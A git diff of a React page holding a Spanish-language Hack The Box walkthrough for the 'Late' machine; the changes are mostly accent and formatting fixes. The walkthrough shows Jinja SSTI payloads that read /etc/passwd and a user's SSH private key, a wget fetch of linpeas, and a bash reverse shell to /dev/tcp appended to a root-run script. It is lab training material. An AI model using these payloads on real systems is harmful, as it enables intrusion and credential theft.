@@ -7,24 +7,28 @@ export function Late() {
     return <>
       <ContentBlock>
         <SubTitle>Escaneo de puertos</SubTitle>
-        <Paragraph> Hacemos nuestro escaneo de puertos como es usual y verificamos cuales estan abiertos y que servicios estan corriendo en cada uno por ejemplo en esta  Maquina tenemos el puerto 80 y 22</Paragraph>
+        <Paragraph>
+          Hacemos nuestro escaneo de puertos como es usual y verificamos cuáles están abiertos y qué servicios están corriendo en cada uno, por ejemplo en esta  Máquina tenemos el puerto 80 y 22
+        </Paragraph>
         <Highlighter
           text=' nmap -p- --open --min-rate 5000 -Pn 10.10.11.156 -oG puertosAbiertos'
         />
-        <Paragraph>Vemos que en el puerto 80 esta corriendo un servidor web <strong>late.htb</strong> lo agregamos a nuestro archivito <strong>/etc/hosts</strong> de nuestra maquina</Paragraph>
+        <Paragraph>
+          Vemos que en el puerto 80 está corriendo un servidor web <strong>late.htb</strong> lo agregamos a nuestro archivo <strong>/etc/hosts</strong> de nuestra máquina
+        </Paragraph>
         <Highlighter text='10.10.11.156 late.htb' />
       </ContentBlock>
   
       <ContentBlock className="content block">
-        <SubTitle>Enumeracion</SubTitle>
+        <SubTitle>Enumeración</SubTitle>
         <Paragraph>
-          Mientras hacemos un recorrido por la pàgina notamos que en la parte de abajo tenemos unos nuevos enlaces que apuntan a <strong>images.late.htb </strong>,
-          lo añadimos a <strong>/etc/hosts </strong>para luego ingresar a la url, y vemos la siguiente vista:
-          <button className="js-modal-trigger" data-target="modal-js-example">
+          Mientras hacemos un recorrido por la página notamos que en la parte de abajo tenemos unos nuevos enlaces que apuntan a <strong>images.late.htb </strong>,
+          lo añadimos a <strong>/etc/hosts </strong>para luego ingresar a la URL, y vemos la siguiente vista:
+        <button className="js-modal-trigger" data-target="modal-js-example">
             <img
               layout="fill"
               src='/fuzzing_enumeration.png'
-              alt='Enumeracion de la maquina Late en Hack The Box'
+              alt='Enumeración de la maquina Late en Hack The Box'
             />
           </button>
         </Paragraph>
@@ -32,7 +36,9 @@ export function Late() {
   
       <ContentBlock>
         <SubTitle>Archivo hosts</SubTitle>
-        <Paragraph>En el archivo <strong>/etc/hosts</strong> de nuestra maquina añadimos:</Paragraph>
+        <Paragraph>
+          En el archivo <strong>/etc/hosts</strong> de nuestra máquina añadimos:
+        </Paragraph>
         <Highlighter text='10.10.11.156 images.late.htb' />
         <Paragraph>Nos vamos a la nueva URL: </Paragraph>
         <figure className={`image is-square block`}>
@@ -46,7 +52,7 @@ export function Late() {
   
       <ContentBlock>
         <Paragraph>
-          Vemos en el titulo que esta pàgina usa Flask, necesitamos saber como funciona este conversor de imagen a texto
+          Vemos en el título que esta página usa Flask, necesitamos saber como funciona este conversor de imagen a texto
           creamos nuestra imagen con Photoshop, GIMP, etc. Testeamos la App para vulnerabilidades comunes como XSS, SQLi y CMDi
           abrimos e ingresamos payloads para estas vulnerabilidades enganchamos que una SSTI funciona <strong>&#123; &#123; 7 * 7 &#125; &#125;</strong>
         </Paragraph>
@@ -57,7 +63,7 @@ export function Late() {
   
       <ContentBlock>
         <Paragraph>
-          La palabra “Late” nos dice porque un SSTi pudo funcionar (Temp”late”). Al intentar conseguir nuetro RCE al subir una imagen con el siguiente payload por ejemplo
+          La palabra “Late” nos dice porque un SSTi pudo funcionar (Temp”late”). Al intentar conseguir nuestro RCE al subir una imagen con el siguiente payload por ejemplo
         </Paragraph>
         <Highlighter
           text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }}"
@@ -69,16 +75,16 @@ export function Late() {
           text="f{ ‘’_lsd__. _mro__.subclasses__([‘/etc/passwd’).read() }}"
         />
         <Paragraph>
-          Despues de verificar esto notamos que tenemos execucion de remota de comandos y podemos ver el archivo /etc/passwd
+          Después de verificar esto notamos que tenemos ejecución de remota de comandos y podemos ver el archivo /etc/passwd
           Notamos que hay un usuario "svc_acc" con su llave ssh privada y capacidad de login.
           Volvemos a subir nuestro payload, cambiando el path al archivo id_rsa.
         </Paragraph>
         <Highlighter
           text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/home/svc_acc/.ssh/id_rsa’).read() }}"
         />
-        IMAGEN
+          IMAGEN
         <Paragraph>
-          Ahora que tenemos el id_rsa hacemos un lógin con el usuario svc_acc
+          Ahora que tenemos el id_rsa hacemos un login con el usuario svc_acc
         </Paragraph>
         <Highlighter
           text="chmod 600 id_rsa"
@@ -94,8 +100,11 @@ export function Late() {
           Montamos nuestro servidor
         </Paragraph>
         <Highlighter text="python3 -m http.server 8080" />
-        <Paragraph>Luego en la maquina Late</Paragraph>
-        <Highlighter text="svc_acc@late:~$ wget http://10.10.14.63:8080/linpeas.sh"
+        <Paragraph>
+          Luego en la máquina Late
+        </Paragraph>
+        <Highlighter 
+          text="svc_acc@late:~$ wget http://10.10.14.63:8080/linpeas.sh"
         />
         <Highlighter text="chmod +x linpeas.sh" />
         <Highlighter text="./linpeas.sh" />
@@ -120,7 +129,7 @@ export function Late() {
           fi
           " />
           <Paragraph>
-            Vemos que se ejecuta cada vez que entablamos una sesion.
+            Vemos que se ejecuta cada vez que entablamos una sesión
             inspeccionamos los atributos que tiene aunque no tiene el de
             escribir podemos crear un archivo y anexarlo.
           </Paragraph>
@@ -134,8 +143,7 @@ export function Late() {
           <Highlighter text="bash -i >& /dev/tcp/10.10.14.63/9999 0>&1" />
           <Highlighter text="cat file.txt >> /usr/local/sbin/ssh-alert.sh" />
           <Paragraph>
-            Configuramos un netcat en la Late y de nuestra maquina hamos login.
-          </Paragraph>
+            Configuramos un netcat en la Late y en nuestra máquina hacemos login.          </Paragraph>
           <Highlighter text="nc -lvnp 9999"/>
       </ContentBlock>
       <SubTitle>Congratulations leonardo Late has been Pwned!</SubTitle>
